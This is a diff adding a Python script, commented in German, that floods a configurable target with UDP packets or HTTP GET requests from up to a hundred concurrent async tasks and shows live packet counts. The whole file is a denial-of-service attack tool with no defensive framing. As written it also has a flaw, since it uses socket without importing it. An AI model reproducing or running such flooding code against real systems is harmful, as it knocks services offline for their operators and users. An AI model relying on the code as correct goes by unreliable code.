@@ -1,0 +1,75 @@
+import asyncio
+import random
+import aiohttp
+import time
+import yaml
+
+# Globale Variablen
+packet_counter = 0
+stop_event = asyncio.Event()
+
+# Funktion für Echtzeitstatistiken
+async def show_statistics():
+    global packet_counter
+    while not stop_event.is_set():
+        print(f"Gesendete Pakete: {packet_counter}")
+        await asyncio.sleep(1)
+
+# UDP Flood (asynchron)
+async def udp_flood(ip, port, packet_size):
+    global packet_counter
+    udp_bytes = random._urandom(packet_size)
+    loop = asyncio.get_event_loop()
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        while not stop_event.is_set():
+            await loop.run_in_executor(None, sock.sendto, udp_bytes, (ip, port))
+            packet_counter += 1
+
+# HTTP GET Flood (asynchron)
+async def http_get_flood(target_url):
+    global packet_counter
+    async with aiohttp.ClientSession() as session:
+        while not stop_event.is_set():
+            try:
+                async with session.get(target_url):
+                    packet_counter += 1
+            except:
+                pass
+
+# Lade Konfiguration aus YAML-Datei
+def load_config(config_path="config.yaml"):
+    with open(config_path, "r") as file:
+        return yaml.safe_load(file)
+
+# Hauptprogramm
+async def main():
+    global stop_event
+    config = load_config()
+
+    ip = config.get("target_ip", "127.0.0.1")
+    port = config.get("target_port", 80)
+    packet_size = config.get("packet_size", 1024)
+    method = config.get("method", "udp_flood")
+    num_tasks = config.get("num_tasks", 100)
+    target_url = config.get("target_url", f"http://{ip}")
+
+    # Starte Statistik-Anzeige
+    asyncio.create_task(show_statistics())
+
+    # Starte Angriffe
+    try:
+        tasks = []
+        if method == "udp_flood":
+            print("Starte UDP Flood...")
+            tasks = [udp_flood(ip, port, packet_size) for _ in range(num_tasks)]
+        elif method == "http_get_flood":
+            print("Starte HTTP GET Flood...")
+            tasks = [http_get_flood(target_url) for _ in range(num_tasks)]
+
+        await asyncio.gather(*tasks)
+    except KeyboardInterrupt:
+        print("Angriff gestoppt.")
+        stop_event.set()
+
+if __name__ == "__main__":
+    asyncio.run(main())
